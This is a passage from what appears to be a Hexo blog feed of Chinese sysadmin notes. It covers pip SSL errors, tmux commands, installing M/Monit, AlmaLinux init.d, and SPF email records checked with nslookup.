class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@<span class="hljs-number">10</span> tmp]<span class="hljs-comment"># conda info -e</span><br><br><span class="hljs-comment"># conda environments:</span><br><span class="hljs-comment">#</span><br>base                 * <span class="hljs-regexp">/root/</span>.miniconda3<br>open_manus             <span class="hljs-regexp">/root/</span>.miniconda3<span class="hljs-regexp">/envs/</span>open_manus<br></code></pre></td></tr></table></figure><h1 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h1><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><h3 id="更新pip包"><a href="#更新pip包" class="headerlink" title="更新pip包"></a>更新pip包</h3><p>python3 -m pip install –upgrade pip</p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><h3 id="install-package-error"><a href="#install-package-error" class="headerlink" title="install package error"></a>install package error</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  python3 -m pip install requests<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">4</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">3</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">2</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">1</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">0</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br>Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">fetch</span> URL https://pypi.org/simple/requests/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;pypi.org&#x27;</span>, port=<span class="hljs-number">443</span>): Max retries exceeded <span class="hljs-keyword">with</span> url: /simple/requests/ (Caused <span class="hljs-keyword">by</span> SSLError(SSLCertVerificationError(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1020)&#x27;</span>))) - skipping<br>ERROR: Could <span class="hljs-keyword">not</span> find a <span class="hljs-keyword">version</span> that satisfies the requirement requests (<span class="hljs-keyword">from</span> versions: <span class="hljs-keyword">none</span>)<br>Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">fetch</span> URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;pypi.org&#x27;</span>, port=<span class="hljs-number">443</span>): Max retries exceeded <span class="hljs-keyword">with</span> url: /simple/pip/ (Caused <span class="hljs-keyword">by</span> SSLError(SSLCertVerificationError(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1020)&#x27;</span>))) - skipping<br>ERROR: <span class="hljs-keyword">No</span> matching distribution <span class="hljs-built_in">found</span> <span class="hljs-keyword">for</span> requests<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>可能是代理问题，关闭代理</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  code python3 -m pip install requests<br>Collecting requests<br>  Downloading requests<span class="hljs-number">-2.32</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">4.6</span> kB)<br>Collecting charset-normalizer&lt;<span class="hljs-number">4</span>,&gt;=<span class="hljs-number">2</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading charset_normalizer<span class="hljs-number">-3.4</span><span class="hljs-number">.0</span>-cp313-cp313-macosx_11_0_arm64.whl.metadata (<span class="hljs-number">34</span> kB)<br>Collecting idna&lt;<span class="hljs-number">4</span>,&gt;=<span class="hljs-number">2.5</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading idna<span class="hljs-number">-3.10</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">10</span> kB)<br>Collecting urllib3&lt;<span class="hljs-number">3</span>,&gt;=<span class="hljs-number">1.21</span><span class="hljs-number">.1</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading urllib3<span class="hljs-number">-2.2</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">6.5</span> kB)<br>Collecting certifi&gt;=<span class="hljs-number">2017.4</span><span class="hljs-number">.17</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading certifi<span class="hljs-number">-2024.8</span><span class="hljs-number">.30</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">2.2</span> kB)<br>Downloading requests<span class="hljs-number">-2.32</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">64</span> kB)<br>Downloading certifi<span class="hljs-number">-2024.8</span><span class="hljs-number">.30</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">167</span> kB)<br>Downloading charset_normalizer<span class="hljs-number">-3.4</span><span class="hljs-number">.0</span>-cp313-cp313-macosx_11_0_arm64.whl (<span class="hljs-number">119</span> kB)<br>Downloading idna<span class="hljs-number">-3.10</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">70</span> kB)<br>Downloading urllib3<span class="hljs-number">-2.2</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">126</span> kB)<br>Installing collected packages: urllib3, idna, charset-normalizer, certifi, requests<br>  <span class="hljs-built_in">WARNING</span>: The script normalizer <span class="hljs-keyword">is</span> installed <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/Library/Frameworks/Python.framework/Versions/3.13/bin&#x27;</span> which <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">on</span> <span class="hljs-type">PATH</span>.<br>  Consider adding this directory <span class="hljs-keyword">to</span> <span class="hljs-type">PATH</span> <span class="hljs-keyword">or</span>, <span class="hljs-keyword">if</span> you prefer <span class="hljs-keyword">to</span> suppress this <span class="hljs-built_in">warning</span>, use <span class="hljs-comment">--no-warn-script-location.</span><br>Successfully installed certifi<span class="hljs-number">-2024.8</span><span class="hljs-number">.30</span> charset-normalizer<span class="hljs-number">-3.4</span><span class="hljs-number">.0</span> idna<span class="hljs-number">-3.10</span> requests<span class="hljs-number">-2.32</span><span class="hljs-number">.3</span> urllib3<span class="hljs-number">-2.2</span><span class="hljs-number">.3</span><br><br>[<span class="hljs-keyword">notice</span>] A <span class="hljs-built_in">new</span> <span class="hljs-keyword">release</span> <span class="hljs-keyword">of</span> pip <span class="hljs-keyword">is</span> available: <span class="hljs-number">24.2</span> -&gt; <span class="hljs-number">24.3</span><span class="hljs-number">.1</span><br>[<span class="hljs-keyword">notice</span>] <span class="hljs-keyword">To</span> <span class="hljs-keyword">update</span>, run: python3 -m pip install <span class="hljs-comment">--upgrade pip</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>exceltips</title>
    <link href="/2024/10/29/yunwei/yunweitips/exceltips/"/>
    <url>/2024/10/29/yunwei/yunweitips/exceltips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="自动适配列宽度"><a href="#自动适配列宽度" class="headerlink" title="自动适配列宽度"></a><strong>自动适配列宽度</strong></h2><h3 id="for-mac"><a href="#for-mac" class="headerlink" title="for mac"></a><strong>for mac</strong></h3><p><strong>使用功能区按钮</strong></p><p>1、选择需要调整的列</p><p>2、转到工具栏的“开始”选项卡</p><p>3、找到“格式”按钮并点击</p><p>4、在弹出的菜单中选择“自动调整列宽”</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
      <tag>excel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux</title>
    <link href="/2024/10/29/yunwei/applications/tmux/tmux/"/>
    <url>/2024/10/29/yunwei/applications/tmux/tmux/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a><strong>Centos</strong></h3><p>yum install tmux -y</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># rpm -qa | grep tmux tmux-1.8-4.el7.x86_64</span><br></code></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><strong>Ubuntu</strong></h3><p>apt-get install tmux</p><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a><strong>Mac</strong></h3><p>brew install tmux</p><h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a><strong>操作命令</strong></h2><h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a><strong>新建会话</strong></h3><p><strong>tmux new -s</strong> </p><h3 id="列举后台运行会话"><a href="#列举后台运行会话" class="headerlink" title="列举后台运行会话"></a><strong>列举后台运行会话</strong></h3><p><strong>tmux ls</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="连接指定后台运行会话"><a href="#连接指定后台运行会话" class="headerlink" title="连接指定后台运行会话"></a><strong>连接指定后台运行会话</strong></h3><p><strong>tmux a -t sessionName</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta"># tmux a -t logs</span><br>[<span class="hljs-meta">detached</span>]<br>[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="重命名会话名"><a href="#重命名会话名" class="headerlink" title="重命名会话名"></a><strong>重命名会话名</strong></h3><p><strong>tmux rename -t oldName newName</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux rename -t logs securelog</span><br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>securelog: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="操作快捷键"><a href="#操作快捷键" class="headerlink" title="操作快捷键"></a><strong>操作快捷键</strong></h2><h3 id="分离会话"><a href="#分离会话" class="headerlink" title="分离会话"></a><strong>分离会话</strong></h3><p>退出界面，会话保持在后台</p><p><strong>ctrl+b 接 d</strong></p><h3 id="重命名会话"><a href="#重命名会话" class="headerlink" title="重命名会话"></a><strong>重命名会话</strong></h3><p><strong>ctr+b 接 $</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">rename</span>-<span class="hljs-keyword">session</span>) logs<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>tmux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vmware_base</title>
    <link href="/2024/10/29/yunwei/applications/vmware/vmware_base/"/>
    <url>/2024/10/29/yunwei/applications/vmware/vmware_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>workstation-and-fusion</p><p><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion</a></p><p>VMwareWorkstationPro</p><p><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion</a></p><p><a href="https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Workstation%20Pro&freeDownloads=true">https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Workstation%20Pro&amp;freeDownloads=true</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mmonit_install</title>
    <link href="/2024/05/29/yunwei/applications/mmonit/mmonit_install/"/>
    <url>/2024/05/29/yunwei/applications/mmonit/mmonit_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>1、下载文件</p><p>wget  <a href="https://mmonit.com/dist/mmonit-4.2.2-linux-x64.tar.gz">https://mmonit.com/dist/mmonit-4.2.2-linux-x64.tar.gz</a></p><p>2、解压文件</p><p>tar -zxvf mmonit-4.2.2-linux-x64.tar.gz</p><p>3、启动守护程序</p><p>cd mmonit-4.2.2&#x2F;</p><p>.&#x2F;bin&#x2F;mmonit</p><p>4、修改监听端口</p><p>配置文件：.&#x2F;conf&#x2F;server.xm</p><p>默认端口：8080</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;Connector address<span class="hljs-operator">=</span><span class="hljs-string">&quot;*&quot;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;8080&quot;</span> processors<span class="hljs-operator">=</span><span class="hljs-string">&quot;25&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>修改监听端口：54321</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;Connector address<span class="hljs-operator">=</span><span class="hljs-string">&quot;*&quot;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;54321&quot;</span> processors<span class="hljs-operator">=</span><span class="hljs-string">&quot;25&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>5、重新启动</p><p>kill mmonit 进程</p><p>.&#x2F;bin&#x2F;mmonit</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:54321</span>           <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">2963155</span>/./bin/mmoni<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>mmonit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>mmonit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_almalinux_no_init.d</title>
    <link href="/2024/05/17/yunwei/errors/Linuxerrors/error_almalinux_no_init.d/"/>
    <url>/2024/05/17/yunwei/errors/Linuxerrors/error_almalinux_no_init.d/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在AlmaLinux release 9.2 (Turquoise Kodkod)系统中没有找到&#x2F;etc&#x2F;init.d文件夹，该文件夹常备用来设置服务启动</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>因为是由一个chkconfig的包来实现脚本的服务管理的，&#x2F;etc&#x2F;init.d&#x2F;也只是&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;的软连接，所以没有&#x2F;etc&#x2F;init.d就把chkconfig的包装一下就行了</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">dnf <span class="hljs-keyword">install</span> chkconfig<br></code></pre></td></tr></table></figure><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】 linux &#x2F;etc&#x2F;init.d&#x2F;目录不存在  2023-03-08 11:16 碎了的冰</p><p><a href="https://www.cnblogs.com/lightice/p/17191350.html">https://www.cnblogs.com/lightice/p/17191350.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mailsec_spf</title>
    <link href="/2024/05/16/security/itsec/mailsec/mailsec_spf/"/>
    <url>/2024/05/16/security/itsec/mailsec/mailsec_spf/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SPF-Sender-Policy-Framework"><a href="#SPF-Sender-Policy-Framework" class="headerlink" title="SPF(Sender Policy Framework)"></a>SPF(Sender Policy Framework)</h1><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>可以防止别人伪造你来发邮件，是一个反伪造邮件的解决方案。</p><p>当你定义了你的邮箱域名的 SPF 记录之后，接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在 SPF 记录里面，如果在，则认为是一份正确的邮件，否则则认为是一份伪造的邮件。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><p>SPF简单说就是域名DNS的txt记录</p><p>SPF 记录包含在一个 TXT 记录中</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p> <strong>v&#x3D;spf1 [[pre] type [ext]] … [mod]</strong></p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>每个参数的含义：</p><p>v&#x3D;spf1 : SPF 的版本，如果使用 Sender ID 的话，这个字段就应该是 v&#x3D;spf2</p><p>pre: 定义匹配时的返回值</p><p>可能返回值包括：</p><p>+，在验证完成的时候表示通过。 </p><p>- 表示验证失败。这个值通常是 -all ，表示没有其他任何匹配发生，会直接丢弃邮件。</p><p>~ 表示软验证，通常表示验证没有完成，不会直接丢弃邮件，可能会进入垃圾箱或者隔离。 </p><p>? 表示不置可否。这个值也通常在测试没有完成的时候使用</p><p>type:定义使用的确认测试的类型</p><p>可能的值包括：</p><p><a href="https://blog.51cto.com/alandai/1929489">https://blog.51cto.com/alandai/1929489</a></p><p><a href="http://www.magicwinmail.com/technic_spf.php">http://www.magicwinmail.com/technic_spf.php</a></p><p><a href="https://help.aliyun.com/knowledge_detail/36771.html">https://help.aliyun.com/knowledge_detail/36771.html</a></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>v&#x3D;spf1 a mx -all</p><p>表示允许a记录和MX服务器的A记录发送邮件</p><p>v&#x3D;spf1 a:test.com -all</p><p>表示允许test.com域名的a记录发送邮件</p><p>v&#x3D;spf1 a&#x2F;24 a:test.test.com&#x2F;24 -all</p><p>表示允许a记录的C段都允许,如果test.test.com存在多个A记录地址，每个A记录的C段都允许发送邮件</p><p>v&#x3D;spf1 mx mx:test.domain.com -all</p><p>表示当前域名的mx记录对应的a记录IP，和test.domain.com的mx记录对应的a记录IP允许发送邮件</p><h3 id="查看方法"><a href="#查看方法" class="headerlink" title="查看方法"></a><strong>查看方法</strong></h3><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a><strong>Windows：</strong></h4><p><strong>nslookup -q&#x3D;txt domain</strong></p><p><strong>nslookup -type&#x3D;txt domain</strong></p><h5 id="有SPF的域名"><a href="#有SPF的域名" class="headerlink" title="有SPF的域名"></a>有SPF的域名</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">D:\&gt;nslookup -q=txt qq.com</span><br><span class="hljs-section">服务器:  UnKnown</span><br><span class="hljs-section">Address:  10.211.1.8</span><br><br><span class="hljs-section">非权威应答:</span><br>qq.com  text =<br><br>        <span class="hljs-string">&quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br></code></pre></td></tr></table></figure><p>解释：include:spf.mail.qq.com表示使用spf.mail.qq.com的spf记录</p><p>​      -all 表示除spf.mail.qq.com spf设置的IP外，其他的硬拒绝，就是完全不收</p><p>因为spf其实最终都是针对IP进行限制的，所以想要看具体限制的IP，可以接着查询对应域名的spf记录，例如查询spf.mail.qq.com</p><p><strong>nslookup -type&#x3D;txt spf.mail.qq.com</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">D:\&gt;nslookup -q=txt spf<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>服务器:  UnKnown<br>Address:  <span class="hljs-number">10.211</span>.<span class="hljs-number">1.8</span><br><br>非权威应答:<br>spf<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">text</span> =<br><br>        <span class="hljs-string">&quot;v=spf1 include:qq-a.mail.qq.com include:qq-b.mail.qq.com include:qq-c.mail.qq.com include:biz-a.mail.qq.com include:biz-b.mail.qq.com include:biz-c.mail.qq.com include:biz-d.mail.qq.com -all&quot;</span><br><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">116.128</span>.<span class="hljs-number">153.20</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span 